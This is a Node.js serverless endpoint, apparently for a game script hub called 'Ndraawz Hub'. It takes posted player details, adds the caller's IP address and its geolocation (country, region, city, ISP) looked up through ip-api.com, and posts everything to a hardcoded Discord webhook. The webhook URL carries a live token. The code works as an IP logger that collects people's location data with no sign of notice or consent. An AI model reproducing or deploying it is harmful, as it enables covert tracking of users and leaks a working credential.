const https = require('https');
const http = require('http');

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

const BOT_USERNAME = "Ndraawz Hub Logger";
const BOT_AVATAR_URL = "https://cdn.discordapp.com/attachments/1464912658108125278/1472698650848395451/icon.png";
const FOOTER_ICON_URL = "https://cdn.discordapp.com/attachments/1464912658108125278/1472698650848395451/icon.png";
const EMBED_COLOR = 0x00e5ff;

function getGeoInfo(ip) {
    return new Promise((resolve) => {
        const url = `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,as,org,query`;
        const timeout = setTimeout(() => resolve(null), 5000);

        http.get(url, (geoRes) => {
            let data = '';
            geoRes.on('data', chunk => data += chunk);
            geoRes.on('end', () => {
                clearTimeout(timeout);
                try {
                    const json = JSON.parse(data);
                    if (json.status === 'success') {
                        resolve({
                            country: json.country || "N/A",
                            region: json.regionName || "N/A",
                            city: json.city || "N/A",
                            isp: json.isp || "N/A",
                            as: json.as || "N/A",
                            org: json.org || "N/A"
                        });
                    } else {
                        resolve(null);
                    }
                } catch (e) {
                    resolve(null);
                }
            });
        }).on('error', () => {
            clearTimeout(timeout);
            resolve(null);
        });
    });
}

async function sendToDiscord(embed) {
    const payload = JSON.stringify({
        username: BOT_USERNAME,
        avatar_url: BOT_AVATAR_URL,
        embeds: [embed]
    });

    const url = new URL(DISCORD_WEBHOOK);
    const options = {
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };

    return new Promise((resolve) => {
        const req = https.request(options, (res) => {
            res.resume();
            resolve(res.statusCode === 204 || res.statusCode === 200);
        });
        req.on('error', () => resolve(false));
        req.write(payload);
        req.end();
    });
}

async function getRawBody(req) {
    if (req.body) {
        if (typeof req.body === 'object') return req.body;
        if (typeof req.body === 'string') return JSON.parse(req.body);
    }
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try { resolve(JSON.parse(body)); }
            catch (e) { reject(e); }
        });
        req.on('error', reject);
    });
}

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || "unknown";
    const cleanIp = clientIp.replace('::ffff:', '').trim();

    try {
        const data = await getRawBody(req);
        if (!data) return res.status(400).json({ error: 'Empty body' });

        if (data.type === "security") {
            const embed = {
                title: "❗️ Ndraawz Security System ❗️",
                description: data.message || "No message",
                color: EMBED_COLOR,
                footer: { text: "Ndraawz Logger System", icon_url: FOOTER_ICON_URL },
                timestamp: new Date().toISOString()
            };
            await sendToDiscord(embed);
            return res.status(200).json({ ok: true });
        }

        if (data.type === "player" && Array.isArray(data.fields)) {
            const geoData = await getGeoInfo(cleanIp);

            const allFields = [
                ...data.fields,
                { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
                { name: "📡 IP Address", value: cleanIp || "N/A", inline: false }
            ];

            if (geoData) {
                allFields.push(
                    { name: "🚩 Country", value: geoData.country, inline: false },
                    { name: "📍 Region", value: geoData.region, inline: false },
                    { name: "🏙️ City", value: geoData.city, inline: false },
                    { name: "🏢 ISP", value: geoData.isp, inline: false },
                    { name: "📡 AS / Org", value: `${geoData.as} / ${geoData.org}`, inline: false }
                );
            } else {
                allFields.push({ name: "⚠️ Info", value: "Geolokasi gagal diambil", inline: false });
            }

            const embed = {
                title: "🚀 Ndraawz Logger System",
                color: EMBED_COLOR,
                fields: allFields,
                footer: { text: "Ndraawz Logger System", icon_url: FOOTER_ICON_URL },
                timestamp: new Date().toISOString()
            };

            await sendToDiscord(embed);
            return res.status(200).json({ ok: true });
        }

        return res.status(400).json({ error: 'Invalid request format' });

    } catch (err) {
        console.error(`[LOG] Error: ${err.message}`);
        return res.status(400).json({ error: 'Invalid JSON' });
    }
};
